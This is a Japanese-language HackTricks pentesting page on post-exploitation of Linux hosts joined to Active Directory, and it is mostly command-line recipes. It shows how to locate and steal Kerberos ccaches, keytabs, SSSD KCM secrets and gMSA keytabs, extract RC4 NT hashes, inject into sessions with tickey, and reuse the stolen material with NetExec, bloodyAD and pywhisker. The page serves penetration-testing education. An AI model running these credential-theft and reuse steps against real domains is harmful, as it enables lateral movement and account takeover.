# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

LinuxマシンもActive Directory環境内に存在する場合があります。

AD内のLinuxマシンは、**Kerberosマテリアルをローカルに保存**できます。これには、ユーザーのccache、マシンまたはサービスのkeytab、SSSDが管理するsecretが含まれます。これらのアーティファクトは通常、他のKerberos credentialと同様に再利用できます。その大半を読み取るには、チケットの所有ユーザーまたはマシン上の**root**である必要があります。

## 列挙

### LinuxからのAD列挙

Linux上でAD（またはWindows上のbash）にアクセスできる場合は、[https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn)を使ってADを列挙できます。

以下のページでは、**LinuxからADを列挙するその他の方法**について学ぶこともできます。


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPAは、主に**Unix**環境向けの、Microsoft Windows **Active Directory**に対するオープンソースの**代替**です。完全な**LDAP directory**と、Active Directoryに類似した管理を行うMIT **Kerberos** Key Distribution Centerを組み合わせています。CAおよびRAのcertificate管理にDogtag **Certificate System**を利用し、smartcardを含む**multi-factor** authenticationをサポートします。SSSDはUnix authentication process向けに統合されています。詳細については、以下を参照してください。


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### ドメイン参加ホストのアーティファクト

ticketを扱う前に、**ホストがどのようにADへ参加したか**、そして**Kerberosマテリアルが実際にどこへ保存されているか**を特定します。最新のLinuxホストでは、これは通常、`/tmp`内の単なるflat fileではなく、`realmd` + `adcli` + `sssd`によって処理されます。
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
これは、ホストが AD を信頼しているか、SSSD が identity や ticket を cache しているか、さらに **machine/service keytabs** や **KCM secrets** が abuse に利用可能かをすばやく確認できます。

## ticket の扱い

### Pass The Ticket

このページでは、**Linux host 内で kerberos tickets を見つけられる場所**を確認できます。以下のページでは、これらの CCache ticket formats を Kirbi（Windows で使用する形式）に変換する方法と、PTT attack の実行方法を説明しています。


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

**Linux-specific ticket harvesting workflows**（`FILE`、`DIR`、`KEYRING`、`KCM`、`/proc` など）については、専用ページを確認してください。

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### /tmp からの CCACHE ticket reuse

CCACHE files は **Kerberos credentials の保存**に使用される binary formats です。`FILE:/tmp/krb5cc_%{uid}` は現在でも一般的ですが、modern Linux deployments では `DIR:/run/user/%{uid}/krb5cc*`、`KEYRING:persistent:%{uid}`、`KCM:%{uid}` も使用されます。ticket が `/tmp` に存在すると決めつける前に、**`KRB5CCNAME`** environment variable と `default_ccache_name` setting を確認してください。
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### keyringからのCCACHE ticket reuse

**プロセスのメモリに保存されたKerberos ticketsはextractできます**。特に、マシンのptrace protection（`/proc/sys/kernel/yama/ptrace_scope`）が無効になっている場合に該当します。この目的に便利なtoolは[https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)にあり、sessionsにinjectしてticketsを`/tmp`にdumpすることでextractを容易にします。

このtoolをconfigureして使用するには、以下の手順に従います。
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
この手順では、さまざまな session への inject を試行し、`__krb_UID.ccache` という命名規則で抽出した ticket を `/tmp` に保存することで成功を示します。

### SSSD KCM からの CCACHE ticket reuse

SSSD はデータベースのコピーを `/var/lib/sss/secrets/secrets.ldb` に保持します。対応する key は、`/var/lib/sss/secrets/.secrets.mkey` に hidden file として保存されています。デフォルトでは、key は **root** permissions を持っている場合にのみ読み取り可能です。

**`SSSDKCMExtractor`** を --database および --key parameters とともに実行すると、データベースを parse して **secrets を decrypt** します。
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
**credential cache Kerberos blob は、Mimikatz/Rubeus に渡せる使用可能な Kerberos CCache ファイルに変換できます。**

### Quick keytab トリアージ
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### /etc/krb5.keytab からアカウントを抽出する

root 権限で動作するサービスに不可欠なサービスアカウントのキーは、**`/etc/krb5.keytab`** ファイルに安全に保存されています。これらのキーはサービスのパスワードに相当するため、厳重に機密管理する必要があります。

keytab ファイルの内容を確認するには、**`klist`** を使用できます。Linux では、`klist -k -K -e` により、principal、key version number、暗号化方式、raw key material が表示されます。キータイプが **23 / RC4-HMAC** の場合、キーの値はその principal の **NT hash** でもあります。
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
Linuxユーザー向けに、**`KeyTabExtract`** はRC4 HMAC hashをextractする機能を提供し、NTLM hash reuseに利用できます。ただし、これはkeytabに **etype 23 / RC4-HMAC** materialがまだ含まれている場合に限り有効です。**AES-only** 環境では再利用可能なNT hashを取得できない場合がありますが、Kerberos経由でkeytabを直接使用してauthenticateすることはできます。
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
macOSでは、**`bifrost`** はkeytabファイル分析用のツールとして機能します。
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
抽出したアカウントおよびハッシュ情報を利用して、**`NetExec`** などのツールでサーバーへの接続を確立できます。
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache netexec smb <DC_FQDN> --use-kcache
```
### `/etc/krb5.keytab` の machine account を再利用する

`realmd`/`adcli`/`sssd` で join されたシステムでは、`/etc/krb5.keytab` に通常、**computer account** と1つ以上の **host/service principals** が含まれています。**root** を取得している場合、単にダンプするのではなく、`klist -k` で一覧表示される principal のいずれかを使用して TGT を要求し、Linux host 自体として操作します。
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
これは、**computer object** 自体に AD で委任された権限がある場合や、ホストが **gMSA** などの他の secrets の取得を許可されている場合に、特に有用です。

### Linux-first AD tooling で盗んだ Kerberos マテリアルを再利用する

有効な `ccache` または使用可能な keytab があれば、すべてを最初に Windows 形式へ変換することなく、**Linux から直接** AD に対して操作できます。現代の多くの tools は `KRB5CCNAME` / Kerberos auth をネイティブで受け付けます。
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
これは **Linux post-exploitation** と **AD object abuse** の間をつなぐ内容です。object-level abuse の経路自体については、以下を確認してください。

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Linux gMSA / Managed Service Account artefacts

最近の Linux deployments では、AD から **Managed Service Accounts** を直接利用できます。実際には、Linux server を compromise した後、host keytab だけでなく、gMSA から生成された **service-specific keytabs** も見つかる可能性があります。主な確認場所は `/etc/gmsad.conf`、deployment-specific config files、そして `/etc` 配下の追加の `*.keytab` files です。
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
これは、Windows endpoint に一切触れることなく、その gMSA に紐付けられた SPN 用の再利用可能な Kerberos identity を提供します。AD でより高い権限を取得した後の **domain-side** gMSA/dMSA abuse については、以下を参照してください。

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## 参考資料

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)

{{#include ../../banners/hacktricks-training.md}}
